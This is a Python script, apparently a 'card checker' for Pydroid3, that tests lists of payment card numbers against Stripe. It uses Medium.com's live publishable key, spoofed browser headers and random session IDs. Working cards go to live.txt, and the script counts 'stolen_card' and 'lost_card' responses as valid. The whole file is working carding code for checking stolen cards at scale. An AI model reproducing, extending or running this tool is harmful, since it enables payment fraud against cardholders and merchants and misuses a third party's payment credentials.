"""
Medium.com Card Checker for Pydroid3
Reads cards from cards.txt file
Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv
"""

import requests
import random
import string
import uuid
import time
import os

# ============ CONFIGURATION ============
INPUT_FILE = "cards.txt"
LIVE_FILE = "live.txt"
DEAD_FILE = "dead.txt"
DELAY = 2  # Delay between checks (seconds)
# =======================================

def generate_guid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_muid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def generate_sid():
    return str(uuid.uuid4()) + ''.join(random.choices(string.hexdigits.lower(), k=6))

def get_bin_info(cc):
    """Get BIN information"""
    try:
        bin_code = cc[:6]
        r = requests.get(f'https://lookup.binlist.net/{bin_code}', timeout=10)
        if r.status_code == 200:
            data = r.json()
            vendor = data.get('scheme', 'Unknown').upper()
            card_type = data.get('type', 'Unknown').upper()
            level = data.get('brand', 'Unknown').upper()
            bank = data.get('bank', {}).get('name', 'Unknown')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '')
            return f"{vendor} - {card_type} - {level} | {bank} | {country} {flag}"
    except:
        pass
    return f"BIN: {cc[:6]}"

def check_card(cc, mes, ano, cvv):
    """
    Check card via Medium.com Stripe
    Returns: (status, message)
    """
    
    # Normalize year
    if len(str(ano)) == 4:
        ano = str(ano)[-2:]
    mes = str(mes).zfill(2)
    
    guid = generate_guid()
    muid = generate_muid()
    sid = generate_sid()
    session_id = str(uuid.uuid4())
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/83a1f53796; stripe-js-v3/83a1f53796; split-card-element',
        'referrer': 'https://medium.com',
        'time_on_page': str(random.randint(30000, 60000)),
        'client_attribution_metadata[client_session_id]': session_id,
        'client_attribution_metadata[merchant_integration_source]': 'elements',
        'client_attribution_metadata[merchant_integration_subtype]': 'split-card-element',
        'client_attribution_metadata[merchant_integration_version]': '2017',
        'key': 'pk_live_7FReX44VnNIInZwrIIx6ghjl',
        '_stripe_version': '2025-03-31.basil',
    }
    
    try:
        r = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
        response = r.json()
    except Exception as e:
        return 'ERROR', str(e)
    
    # Parse response
    if 'error' in response:
        error = response['error']
        code = error.get('code', '')
        decline_code = error.get('decline_code', '')
        message = error.get('message', 'Unknown error')
        
        # CCN (Approved) codes - card is valid
        ccn_codes = [
            'incorrect_cvc', 'invalid_cvc', 'incorrect_zip',
            'insufficient_funds', 'authentication_required',
            'card_velocity_exceeded', 'do_not_honor',
            'generic_decline', 'lost_card', 'stolen_card',
            'pickup_card', 'restricted_card', 'security_violation',
            'service_not_allowed', 'transaction_not_allowed',
            'withdrawal_count_limit_exceeded', 'expired_card'
        ]
        
        if code in ccn_codes or decline_code in ccn_codes:
            return 'CCN', f"{decline_code or code}"
        
        if 'rate_limit' in code:
            return 'RATE_LIMIT', message
        
        return 'DECLINED', f"{decline_code or code or message}"
    
    # Payment method created = LIVE
    if 'id' in response and response.get('id', '').startswith('pm_'):
        pm_id = response['id']
        return 'LIVE', f"PM Created: {pm_id}"
    
    return 'UNKNOWN', str(response)[:100]

def save_result(card, status):
    """Save card to appropriate file"""
    if status in ['LIVE', 'CCN']:
        with open(LIVE_FILE, 'a') as f:
            f.write(card + '\n')
    else:
        with open(DEAD_FILE, 'a') as f:
            f.write(card + '\n')

def main():
    print("""
    ╔═══════════════════════════════════════╗
    ║      MEDIUM.COM CARD CHECKER          ║
    ║         FOR PYDROID3                  ║
    ║      Stripe $5 Charge Gate            ║
    ╚═══════════════════════════════════════╝
    """)
    
    # Check if cards.txt exists
    if not os.path.exists(INPUT_FILE):
        print(f"[!] {INPUT_FILE} not found!")
        print(f"[*] Creating empty {INPUT_FILE}...")
        with open(INPUT_FILE, 'w') as f:
            f.write("# Add cards here, one per line\n")
            f.write("# Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv\n")
            f.write("# Example: 4403934091847371|06|26|097\n")
        print(f"[*] Please add cards to {INPUT_FILE} and run again.")
        return
    
    # Read cards
    with open(INPUT_FILE, 'r') as f:
        lines = f.readlines()
    
    # Filter valid cards
    cards = []
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            parts = line.split('|')
            if len(parts) >= 4:
                cards.append(line)
    
    if not cards:
        print("[!] No valid cards found in cards.txt")
        print("[*] Format: cc|mm|yy|cvv or cc|mm|yyyy|cvv")
        return
    
    print(f"[*] Loaded {len(cards)} cards")
    print(f"[*] Results will be saved to {LIVE_FILE} and {DEAD_FILE}")
    print(f"[*] Delay: {DELAY}s between checks")
    print("=" * 50)
    
    # Statistics
    total = len(cards)
    live_count = 0
    ccn_count = 0
    dead_count = 0
    
    # Process cards
    for i, card in enumerate(cards, 1):
        parts = card.split('|')
        cc = parts[0].strip()
        mes = parts[1].strip()
        ano = parts[2].strip()
        cvv = parts[3].strip()
        
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        
        print(f"\n[{i}/{total}] Checking: {cc[:6]}xxxxxx{cc[-4:]}")
        
        start = time.time()
        status, message = check_card(cc, mes, ano, cvv)
        elapsed = round(time.time() - start, 2)
        
        # Get BIN info
        bin_info = get_bin_info(cc)
        
        # Display result
        if status == 'LIVE':
            print(f"[CHARGED] {fullcc}")
            print(f"[+] Response: {message}")
            print(f"[+] Info: {bin_info}")
            live_count += 1
            save_result(fullcc, status)
            
        elif status == 'CCN':
            print(f"[CCN] {fullcc}")
            print(f"[+] Response: {message}")
            print(f"[+] Info: {bin_info}")
            ccn_count += 1
            save_result(fullcc, status)
            
        elif status == 'RATE_LIMIT':
            print(f"[RATE LIMITED] Waiting 30s...")
            time.sleep(30)
            dead_count += 1
            
        else:
            print(f"[DECLINED] {fullcc}")
            print(f"[-] Response: {message}")
            dead_count += 1
            save_result(fullcc, status)
        
        print(f"[*] Time: {elapsed}s")
        
        # Delay before next card
        if i < total:
            time.sleep(DELAY)
    
    # Final stats
    print("\n" + "=" * 50)
    print("           RESULTS SUMMARY")
    print("=" * 50)
    print(f"[+] Total Checked: {total}")
    print(f"[+] Live/Charged:  {live_count}")
    print(f"[+] CCN/Approved:  {ccn_count}")
    print(f"[-] Dead/Declined: {dead_count}")
    print("=" * 50)
    print(f"[*] Live cards saved to: {LIVE_FILE}")
    print(f"[*] Dead cards saved to: {DEAD_FILE}")

if __name__ == "__main__":
    main()
